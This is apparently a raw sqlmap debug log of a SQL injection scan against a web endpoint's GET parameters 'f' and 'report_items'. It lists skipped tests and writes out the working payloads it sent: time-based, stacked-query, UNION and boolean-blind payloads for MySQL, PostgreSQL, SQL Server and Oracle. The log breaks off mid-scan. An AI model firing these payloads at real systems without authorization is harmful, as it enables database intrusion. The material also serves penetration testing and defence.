[16:21:58] [DEBUG] skipping test 'Oracle inline queries' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'SQLite inline queries' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'Firebird inline queries' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'ClickHouse inline queries' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because the level (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:21:58] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'

[16:21:58] [PAYLOAD] json');SELECT PG_SLEEP(5)--

[16:21:58] [PAYLOAD] json';SELECT PG_SLEEP(5)--

[16:21:58] [PAYLOAD] json);SELECT PG_SLEEP(5)--

[16:21:58] [PAYLOAD] json;SELECT PG_SLEEP(5)--

[16:21:58] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because the level (4) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because the level (3) is higher than the provided (1)

[16:21:58] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because the level (5) is higher than the provided (1)

[16:21:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'

[16:21:58] [PAYLOAD] json');WAITFOR DELAY '0:0:5'--

[16:21:59] [PAYLOAD] json';WAITFOR DELAY '0:0:5'--

[16:21:59] [PAYLOAD] json);WAITFOR DELAY '0:0:5'--

[16:21:59] [PAYLOAD] json;WAITFOR DELAY '0:0:5'--

[16:21:59] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because the level (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because the level (4) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because the level (5) is higher than the provided (1)

[16:21:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'

[16:21:59] [PAYLOAD] json');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(87)||CHR(66)||CHR(79),5) FROM DUAL--

[16:21:59] [PAYLOAD] json';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(87)||CHR(66)||CHR(79),5) FROM DUAL--

[16:21:59] [PAYLOAD] json);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(87)||CHR(66)||CHR(79),5) FROM DUAL--

[16:21:59] [PAYLOAD] json;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(87)||CHR(66)||CHR(79),5) FROM DUAL--

[16:21:59] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (4) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because the level (4) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because the level (5) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because the level (5) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because the level (5) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

[16:21:59] [PAYLOAD] json') AND (SELECT 7138 FROM (SELECT(SLEEP(5)))cpQd) AND ('jZml'='jZml

[16:21:59] [PAYLOAD] json' AND (SELECT 7138 FROM (SELECT(SLEEP(5)))cpQd) AND 'OHZL'='OHZL

[16:21:59] [PAYLOAD] json) AND (SELECT 7138 FROM (SELECT(SLEEP(5)))cpQd) AND (6471=6471

[16:21:59] [PAYLOAD] json AND (SELECT 7138 FROM (SELECT(SLEEP(5)))cpQd)

[16:21:59] [PAYLOAD] json AND (SELECT 7138 FROM (SELECT(SLEEP(5)))cpQd)-- XNnB

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because the level (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because the level (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because the level (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because the level (2) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because the level (4) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because the level (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because the level (4) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because the level (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because the risk (3) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because the level (5) is higher than the provided (1)

[16:21:59] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because the risk (3) is higher than the provided (1)

[16:21:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'

[16:21:59] [PAYLOAD] json') AND 9388=(SELECT 9388 FROM PG_SLEEP(5)) AND ('leQp'='leQp

[16:21:59] [PAYLOAD] json' AND 9388=(SELECT 9388 FROM PG_SLEEP(5)) AND 'gMTX'='gMTX

[16:21:59] [PAYLOAD] json) AND 9388=(SELECT 9388 FROM PG_SLEEP(5)) AND (6355=6355

[16:22:00] [PAYLOAD] json) AND 9388=(SELECT 9388 FROM PG_SLEEP(0)) AND (6355=6355

[16:22:00] [PAYLOAD] json) AND 9388=(SELECT 9388 FROM PG_SLEEP(5)) AND (6355=6355

[16:22:01] [PAYLOAD] json AND 9388=(SELECT 9388 FROM PG_SLEEP(5))

[16:22:01] [PAYLOAD] json AND 9388=(SELECT 9388 FROM PG_SLEEP(5))-- UYZR

[16:22:01] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because the level (4) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'

[16:22:01] [PAYLOAD] json') WAITFOR DELAY '0:0:5' AND ('ixVU'='ixVU

[16:22:01] [PAYLOAD] json' WAITFOR DELAY '0:0:5' AND 'NvRv'='NvRv

[16:22:01] [PAYLOAD] json) WAITFOR DELAY '0:0:5' AND (8584=8584

[16:22:01] [PAYLOAD] json WAITFOR DELAY '0:0:5'

[16:22:01] [PAYLOAD] json WAITFOR DELAY '0:0:5'-- oREr

[16:22:01] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because the level (4) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [INFO] testing 'Oracle AND time-based blind'

[16:22:01] [PAYLOAD] json') AND 4073=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(120)||CHR(75)||CHR(74),5) AND ('FrGX'='FrGX

[16:22:01] [PAYLOAD] json' AND 4073=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(120)||CHR(75)||CHR(74),5) AND 'Yygl'='Yygl

[16:22:01] [PAYLOAD] json) AND 4073=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(120)||CHR(75)||CHR(74),5) AND (9677=9677

[16:22:01] [PAYLOAD] json AND 4073=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(120)||CHR(75)||CHR(74),5)

[16:22:01] [PAYLOAD] json AND 4073=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(120)||CHR(75)||CHR(74),5)-- pFFy

[16:22:01] [DEBUG] skipping test 'Oracle OR time-based blind' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because the level (4) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because the level (4) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because the level (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because the level (4) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because the level (5) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because the level (5) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:01] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y

[16:22:01] [DEBUG] used the default behavior, running in batch mode

[16:22:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'

[16:22:01] [PAYLOAD] json') ORDER BY 1-- fAqD

[16:22:01] [PAYLOAD] json') ORDER BY 5791-- UAHv

[16:22:01] [PAYLOAD] json' ORDER BY 1-- iZsE

[16:22:01] [PAYLOAD] json' ORDER BY 2468-- uRzC

[16:22:01] [PAYLOAD] json) ORDER BY 1-- eRKK

[16:22:02] [PAYLOAD] json) ORDER BY 6039-- WppX

[16:22:02] [PAYLOAD] json ORDER BY 1-- dlkB

[16:22:02] [PAYLOAD] json ORDER BY 9454-- xFCg

[16:22:02] [PAYLOAD] json ORDER BY 1-- QZrt

[16:22:02] [PAYLOAD] json ORDER BY 2325-- XtZb

[16:22:02] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because the level (2) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:02] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:02] [WARNING] GET parameter 'f' does not seem to be injectable

[16:22:02] [INFO] testing if GET parameter 'report_items' is dynamic

[16:22:02] [PAYLOAD] 6369

[16:22:02] [DEBUG] setting match ratio for current parameter to 0.966

[16:22:02] [INFO] GET parameter 'report_items' appears to be dynamic

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}](."')))).)

[16:22:02] [WARNING] heuristic (basic) test shows that GET parameter 'report_items' might not be injectable

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]'pflaLj<'">yAlrjU

[16:22:02] [INFO] testing for SQL injection on GET parameter 'report_items'

[16:22:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND 4602=7360 AND (1373=1373

[16:22:02] [DEBUG] setting match ratio for current parameter to 0.949

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND 6542=6542 AND (6419=6419

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 6641=3417

[16:22:02] [DEBUG] setting match ratio for current parameter to 0.949

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 6542=6542

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND 3089=4879 AND ('xExf'='xExf

[16:22:02] [DEBUG] setting match ratio for current parameter to 0.949

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND 6542=6542 AND ('Djks'='Djks

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND 8550=7062 AND 'gDLu'='gDLu

[16:22:02] [DEBUG] setting match ratio for current parameter to 0.949

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND 6542=6542 AND 'yDzf'='yDzf

[16:22:02] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 9153=9996-- CqUk

[16:22:03] [DEBUG] setting match ratio for current parameter to 0.949

[16:22:03] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 6542=6542-- qOcL

[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the level (3) is higher than the provided (1)

[16:22:03] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the risk (3) is higher than the provided (1)

